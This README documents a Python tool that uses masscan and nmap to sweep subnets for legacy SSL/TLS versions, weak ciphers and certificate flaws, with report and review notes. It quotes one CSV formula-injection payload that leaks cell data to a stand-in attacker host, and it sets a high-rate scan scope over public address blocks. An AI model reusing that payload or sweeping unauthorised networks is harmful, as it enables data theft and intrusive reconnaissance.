# sslspray.py

Subnet-wide SSL/TLS protocol-version sweep, built the same way as
`ssh_vuln_scan.py` and `quantum_readiness_spray.py`: masscan for fast
discovery, then a worker pool for the actual assessment, with the same live
progress bar / logging conventions. Single Python file — scan, parse, CSV,
and `.xlsx` are all in it.

## What it finds

For every web server in scope, which of these it accepts:

- **SSLv2** (critical — no known-good use case exists)
- **SSLv3** (critical — POODLE)
- **TLS 1.0** (legacy)
- **TLS 1.1** (legacy)
- **TLS 1.2** (current baseline)
- **TLS 1.3** (current best practice)

Plus, per endpoint:

- **Overall cipher-strength grade** (`A`–`F`, nmap's own "least strength" rating across every cipher offered)
- **Every individual weak (`C`/`D`/`F`-graded) cipher suite** — count + detail, independent of protocol version (a TLS 1.2 endpoint can still offer a weak cipher)
- **Certificate details** — subject/issuer CN, self-signed, public key type/bits, signature algorithm (flagging SHA-1/MD5), and expiry (live-computed against today's date, not frozen at scan time)

## Why nmap instead of sslscan / sslyze / testssl / openssl s_client

All of those are available on the Kali box this runs on. `nmap`'s
`ssl-enum-ciphers` (SSLv3 → TLS 1.3) plus `sslv2` (SSLv2) was chosen because
it's the only combination that covers the full range in **one** engine, so
there's exactly one XML format to parse — matching the sibling scripts'
"single engine, single parser" shape — instead of stitching together
sslscan's XML, sslyze's JSON, and openssl's free-text output. It also drops
straight into the same worker-pool model `ssh_vuln_scan.py` already proved
out, with no new parsing path. `sslscan`/`sslyze` remain the right tools for
a manual deep-dive on a single host this script flags — deliberately out of
scope for the bulk sweep.

## Why two phases

The configured scope (`SUBNETS` below) includes a `/8`. Pointing nmap's own
host discovery at that much address space would dominate the entire run.
**Phase 1** uses masscan — a stateless SYN scanner — to find which hosts
across all configured subnets have a TLS port open, in a fraction of the
time. **Phase 2** then only touches real hosts: a pool of worker threads
each run a single, narrowly-targeted `nmap -Pn -n` against one host, skipping
nmap's own (slower) host discovery and DNS resolution entirely, since Phase 1
and a direct reverse-DNS lookup already did both.

## Scope

```python
SUBNETS: List[str] = [
    "1.0.0.0/16",
    "2.0.0.0/16",
    "3.0.0.0/16",
    "4.0.0.0/16",
    "5.0.0.0/16",
    # "6.0.0.0/16",
    "7.0.0.0/16",
    "8.0.0.0/12",
    "9.0.0.0/8",
]

TLS_PORTS: List[int] = [443]
```

Edit either list in the script to change scope — same convention as the
sibling scripts. Add alternate HTTPS ports (`8443`, etc.) to `TLS_PORTS`;
masscan discovery, the nmap `-p` spec, and the "is this port in scope" check
all derive from that one list.

## Requirements

- `masscan` on PATH (unless `--skip-masscan` with a valid `--masscan-output-file`) — needs root/administrator to run
- `nmap` on PATH — always required; there's no fallback protocol-enumeration path
- Python 3.8+
- `openpyxl` — only for the `.xlsx` step. If missing, the run degrades to CSV-only instead of failing.

```bash
pip install openpyxl
```

## Usage

```bash
sudo python sslspray.py
```

Common options:

| Flag | Default | Purpose |
|---|---|---|
| `--workers` | `12` | Concurrent nmap processes in Phase 2. Lower than `ssh_vuln_scan.py`'s 16 — `ssl-enum-ciphers` does one full TLS handshake per candidate cipher suite per protocol version, so each unit of work here is slower. Raise if the host running this has headroom. |
| `--rate` | `25000` | masscan packets/sec |
| `--host-timeout` | `45s` | nmap `--host-timeout` per host, longer than the SSH sibling's 30s for the same reason as `--workers` |
| `--retries` | `1` | Retries per host if a scan comes back empty (covers a transient miss) |
| `--output-dir` | script's own directory | Where the log/CSV/xlsx are written |
| `--interface` | *(none)* | Passed to masscan's `-e` |
| `--skip-masscan` + `--masscan-output-file` | — | Reuse a previous masscan run instead of re-scanning |
| `--keep-temp` | off | Keep each host's raw nmap XML under `<output-dir>/nmap_xml_<date>/` |
| `--no-xlsx` | off | Stop after the CSV |
| `--from-csv FILE` | — | Skip scanning entirely; rebuild the `.xlsx` from an existing CSV |

Resume from a previous masscan run (e.g. discovery already done, iterating on Phase 2 only):

```bash
python sslspray.py --skip-masscan --masscan-output-file .masscan_output_2026-09-10.txt
```

Rebuild just the `.xlsx` from an existing CSV without re-scanning:

```bash
python sslspray.py --from-csv sslspray_2026-09-10.csv
```

## Output

Everything is timestamped and written to `--output-dir` (same convention as
the sibling scripts):

- `sslspray_<date>.log` — full run log (DEBUG-level to file, INFO-level to console)
- `sslspray_<date>.csv` — wide format, one row per confirmed TLS endpoint (host:port)
- `sslspray_<date>.xlsx` — Overview + Report sheets
- `.masscan_output_<date>.txt` — raw masscan hit list (hidden file, kept so `--skip-masscan` can reuse it)

### `sslspray_<date>.csv`

```
ScanDate,IP,Hostname,Port,Banner,SSLv2Supported,SSLv3Supported,TLS10Supported,TLS11Supported,TLS12Supported,TLS13Supported,CipherGrade,ConfiguredSubnet,CertSubjectCN,CertIssuerCN,CertSelfSigned,CertPublicKey,CertSignatureAlgorithm,CertWeakSignatureAlgo,CertNotAfter,WeakCipherCount,WeakCipherDetail
```

A host can appear more than once if `TLS_PORTS` has more than one entry and
more than one is open on it — each row is a distinct TLS endpoint (IP+port
pair), not a distinct host. `ConfiguredSubnet` matches the sibling scripts'
"which entry in `SUBNETS` this host falls under" column.

`WeakCipherDetail` flattens every cipher nmap graded C/D/F on that endpoint
into one pipe-joined text field, `Protocol: CipherName (Grade) | Protocol:
CipherName (Grade) | ...` (same idea as the SSH sibling script's flattened
`HostKeyInfo` column) — a host can offer any number of weak ciphers across
its supported protocols, so this is a variable-length list packed into a
single cell rather than a variable number of columns. `WeakCipherCount` is
the sortable/filterable number that goes with it.

### `sslspray_<date>.xlsx`

Same Overview + Report layout as the sibling scripts: a 3×3 KPI tile grid
(endpoints scanned, SSLv2, SSLv3, TLS 1.0, TLS 1.1, TLS 1.2, TLS 1.3, fully
modern endpoints, at-risk %), a findings-breakdown bar chart for the four
legacy protocols, and a precomputed Top-10 Offenders table on Overview; the
full per-endpoint data on Report, plus four live formulas: `Legacy Protocol
Count`, `Legacy Score`, `Cert Days Until Expiry`, and `Cert Expired`.

The TLS 1.2 and TLS 1.3 tiles are deliberately left uncolored (neutral) —
they're adoption metrics where a higher count is good, not a weakness count
where a higher count is bad, so the sibling scripts' red/amber/green
severity coloring doesn't apply to them.

Below the Top-10 Offenders table, a separate **"Certificate & Cipher
Findings"** section (its own gray section header, same tile styling as the
main grid) adds three more counts: Self-Signed Certs, Expired Certs, and
Endpoints w/ Weak Ciphers. This is deliberately its own block, appended
after everything else, rather than folded into the main 3x3 grid — cert
trust and cipher-strength problems are a different risk category from
protocol downgrade, so they're flagged as a distinct section instead of
implying equal weight by blending in, and appending them at the end means
the grid, chart, and Top Offenders table above never have to shift position.
(Two mockups comparing "blend into the grid" vs. "separate section" were
shown before landing on this — the separate-section approach won.)

## What it checks, and how it's scored

**Legacy Protocol Count** — how many of {SSLv2, SSLv3, TLS 1.0, TLS 1.1} an
endpoint accepts (0–4).

**Legacy Score** — `1000×SSLv2 + 100×SSLv3 + 10×TLS1.0 + 1×TLS1.1` (each
term is 1 or 0). Weighted so any single SSLv2 finding always outranks any
number of TLS 1.1-only findings, mirroring `ssh_vuln_scan.py`'s
SSHv1-gets-a-big-weight approach to its own Weakness Score. Used to build
the Top-10 Offenders ranking; **TLS 1.2 and TLS 1.3 do not appear in this
score at all** — supporting them is not a weakness.

**Only endpoints confirmed to be running TLS are included** — masscan's
Phase 1 hit only proves the port is open, not that TLS is what's listening
there. An endpoint counts only if `ssl-enum-ciphers`, `sslv2`, or `ssl-cert`
actually produced script output, or nmap's `-sV` named the service
`https`/`ssl`/`tls`.

**Weak Cipher Count / Weak Cipher Detail** — every cipher suite nmap itself
grades `C`, `D`, or `F` under any protocol the endpoint supports (e.g. RC4,
3DES, export-grade, NULL ciphers). This is separate scoring from the legacy
protocol flags above — a fully-patched TLS 1.2-only endpoint can still turn
up here if it also offers a weak cipher suite for compatibility. Not folded
into Legacy Score or the Top-10 ranking (that stays protocol-version-only,
matching the tool's original ask) — it gets its own Overview count instead
("Endpoints w/ Weak Ciphers" in the Certificate & Cipher Findings section),
and full detail on the Report sheet.

**Certificate fields** are informational, not scored — mirroring how
`ssh_vuln_scan.py` treats `Host Key Info`. `Cert Weak Signature Algo` and
`Cert Self-Signed` are worth a manual look but aren't counted into Legacy
Score either, since a weak signature algorithm or a self-signed cert is a
PKI/trust problem, not a protocol-downgrade one — different risk category
than what this tool's ranking is built to prioritize. Self-Signed Certs and
Expired Certs each get their own Overview count in the same section; Cert
Weak Signature Algo currently does not (Report-sheet detail only) — flag if
you'd like a fourth tile added for it.

## Architecture notes

**Phase 1 (masscan)** is ported near-verbatim from `ssh_vuln_scan.py` — same
live progress bar (percent/ETA parsed from masscan's own stderr), same
`-oL` list-output parsing, same dedup-by-key approach. Only the port spec
changed (built from `TLS_PORTS` instead of a fixed `T:22`).

**Phase 2** also reuses the sibling's worker-pool-of-nmap-processes shape,
with one difference: a host can have more than one `TLS_PORTS` entry open,
so each host gets **one** nmap invocation covering every open TLS port it
has (`-p 443,8443,...`), and that single XML is parsed into one row per
qualifying port — rather than one nmap call per port.

**Retry logic** mirrors the sibling scripts' "only retry an empty-result"
pattern: a host that comes back with zero rows (no response in time, or a
transient miss) is retried up to `--retries` times; a host nmap successfully
determined isn't running TLS on any of its ports won't change on a retry,
but the bounded-retry-on-empty logic stays simple either way and doesn't
need to special-case it.

**One bad host can't take down the batch** — same per-host exception
guarding as `ssh_vuln_scan.py`, for the same reason (a single host's nmap
process dying mid-write must not lose every result gathered so far).

## Security notes

**CSV/Excel formula injection (CWE-1236) is neutralized.** `hostname`
(reverse-DNS), `banner`, and every certificate field (subject/issuer CN,
public key, signature algorithm, weak-cipher detail) are sourced from
whatever the scanned host presents — attacker-controlled by design, since
that's exactly what this tool audits. Opening the report is the tool's
entire purpose, and Excel/LibreOffice/Google Sheets all auto-evaluate a
cell starting with `=`, `+`, `-`, or `@` as a formula. `_neutralize_formula()`
prefixes a single quote onto any such value before it reaches `csv.writer`
or an openpyxl cell, in both `write_csv()` and `build_report_sheet()`
(Report sheet and the Overview Top-10 table). A cert Subject CN of e.g.
`=HYPERLINK("http://attacker/leak?"&A1)` lands in the report as inert text,
not a live formula.

**A malformed reverse-DNS PTR record can't crash `.xlsx` generation.**
`resolve_hostname()` strips characters illegal in XML 1.0 before the
hostname is used anywhere — every other string field is read out of nmap's
own XML output and is implicitly safe (ElementTree can't have parsed
illegal characters into a value in the first place), but the reverse-DNS
lookup happens outside that pipeline, so it needed its own filter.

## Limitations

**Assumes one scan run per workbook.** Every Overview formula aggregates
over the *entire* Report table. Re-running into the same file would double
count.

**Percentages don't sum to 100%** — a single endpoint can carry more than
one legacy protocol at once (e.g. SSLv3 *and* TLS 1.0), so the per-protocol
percentages overlap by design.

**Masscan needs elevated privileges** (raw sockets) — run with `sudo` / as
Administrator. nmap's per-host scan works either way; unprivileged just
means a TCP connect scan instead of SYN, which given Phase 1 already
confirmed the port is open, has minimal practical impact on Phase 2's speed.

**No downgrade-attack exploitation.** This tool only enumerates what a
server *offers* during the handshake (POODLE, BEAST, etc. are not attempted)
— see the safety block at the top of the script.

**`sslv2`'s NSE output isn't as consistently documented as
`ssl-enum-ciphers`'s** — presence is inferred from the phrase "SSLv2
supported" in its flattened output text. Flag for re-verification against a
live run if a host known to support SSLv2 ever comes back `False`.

**`ssl-cert`'s structured field names carry the same lower confidence** —
subject/issuer `commonName`, `pubkey` type/bits, `sig_algo`, and `validity`
`notAfter` are read from nmap's documented XML shape but weren't checked
against a live nmap install. If a real run shows implausible blanks in the
cert columns, that's the first thing to re-verify.

**Self-signed detection is a heuristic** (subject commonName == issuer
commonName) — it won't catch a self-signed cert whose issuer CN happens to
differ from its subject CN.

**Cert expiry only understands nmap's normal ISO-ish `notAfter` format**
(and the openssl-style fallback format sometimes seen in flattened text).
An unrecognized date format leaves the cert date cell blank rather than
guessing — `_parse_cert_date()` in the script is the place to add a format
if a live run ever hits one.

**Ctrl+C behavior**: first interrupt finishes in-flight work and writes
partial reports; second interrupt force-exits. Same as the sibling scripts.

## Verification

Unlike the SSH sibling (written on a machine believed to have no local
Python interpreter — that turned out to be stale, this one does), this
script was fully exercised locally before being handed off: `py_compile`
for syntax; two hand-built synthetic `nmap -oX` fixtures (a legacy host with
SSLv2/SSLv3/TLS1.0 plus multiple weak (C/D/F-graded) ciphers spread across
two protocols and a self-signed, SHA-1-signed, expired cert; a modern
TLS1.2/1.3-only host with a clean CA-signed cert; a closed port; and a
non-TLS service squatting on 443) run through `parse_xml_file()` to confirm
the protocol booleans, legacy-count/score math, weak-cipher count/detail
flattening, and every cert field including self-signed and weak-signature
detection; a CSV write/read round-trip; and a full `--from-csv` `.xlsx`
rebuild inspected with `openpyxl` to confirm every Overview formula, the
Top-10 ranking, and the new Report-sheet cert/weak-cipher columns and
formulas (`Cert Days Until Expiry`, `Cert Expired`). The masscan-facing code
path (Phase 1 itself) is still ported near-verbatim from the already-proven
`ssh_vuln_scan.py` and wasn't independently re-run here (no masscan binary
on this machine) — same caveat the SSH sibling's own README carries for its
own untested pieces.

**2026-09-10 final review pass:** six independent dimension reviews (schema/
column consistency, XML parsing logic, Excel formula correctness,
concurrency/CLI/retry logic, README-vs-code drift, safety/security), each
followed by adversarial verification of anything flagged before it counted.
Six genuine issues were confirmed and fixed:

1. The `parse_port()` guard meant to drop "script ran but produced nothing
   usable" (e.g. a connection reset mid-handshake) never actually fired,
   because `tls_script_seen` was set True on script *presence*, not on
   whether it yielded real data — an inconclusive scan was silently
   reported as a clean, fully-patched endpoint. Replaced with a single
   `has_usable_data` check based on actual extracted evidence (a protocol,
   a cipher grade, or a cert field), not just "did a script element exist".
2. The "Fully Modern (TLS 1.2/1.3 only)" tile only checked that no legacy
   protocol was set, never that TLS 1.2 or 1.3 was actually confirmed —
   an inconclusive endpoint (all six protocol columns False) would have
   been miscounted as modern. Fixed with an inclusion-exclusion `COUNTIFS`
   formula requiring TLS 1.2 or TLS 1.3 true (deliberately not
   `SUMPRODUCT`, whose array-arithmetic blank-coercion would have wrongly
   matched the ~99,997 empty filler rows below the real data).
3. `read_rows_from_csv()` crashed (`ValueError`/`KeyError`) on a blank or
   entirely-missing standard field instead of degrading gracefully, unlike
   the newer cert/cipher fields which already used `.get(...)`. All fields
   now go through `_csv_field`/`_csv_flag`/`_csv_int` helpers that also
   handle `csv.DictReader`'s `None`-for-a-short-row case, not just a
   missing key.
4. Ctrl+C landing during the per-host reverse-DNS resolution loop (a real
   window — up to a 2s socket timeout per IP across potentially hundreds of
   hosts) could leave `hosts` non-empty but `stop_event` set, and neither
   dispatch branch fired — Phase 2 was silently skipped entirely and an
   empty report was written, contradicting the SIGINT handler's own
   "finishing current work and writing partial reports" message. Fixed by
   no longer gating that dispatch on `stop_event` — `run_phase2()` already
   handles a pre-set `stop_event` correctly on its own.
5. **(security, high)** A malformed/malicious reverse-DNS PTR record
   containing a character illegal in XML 1.0 would crash `.xlsx` generation
   with an uncaught `openpyxl.IllegalCharacterError` *after* a full scan
   completed, losing the `.xlsx` deliverable (contradicting this file's own
   claim that missing `openpyxl` is the only thing that degrades to
   CSV-only). Fixed by stripping XML-illegal characters in
   `resolve_hostname()` — see Security notes above.
6. **(security, high)** Reverse-DNS hostname, banner, and cert
   subject/issuer CN — all attacker-controlled by design — were written
   unescaped into CSV and XLSX cells, a classic CSV/Excel formula-injection
   vector (CWE-1236) since opening the report in Excel is the tool's whole
   purpose. Fixed with `_neutralize_formula()` — see Security notes above.

All six fixes were re-verified afterward with targeted synthetic fixtures
(an errored-script host that must now be dropped; a hand-crafted CSV with a
blank `Port` and missing cert/cipher columns; a row with a formula-injection
payload in `hostname`/`cert_subject_cn` confirmed to land as inert text —
`data_type: 's'`, not `'f'` — in the actual generated `.xlsx`), plus a full
re-run of the original regression fixtures to confirm nothing else broke.
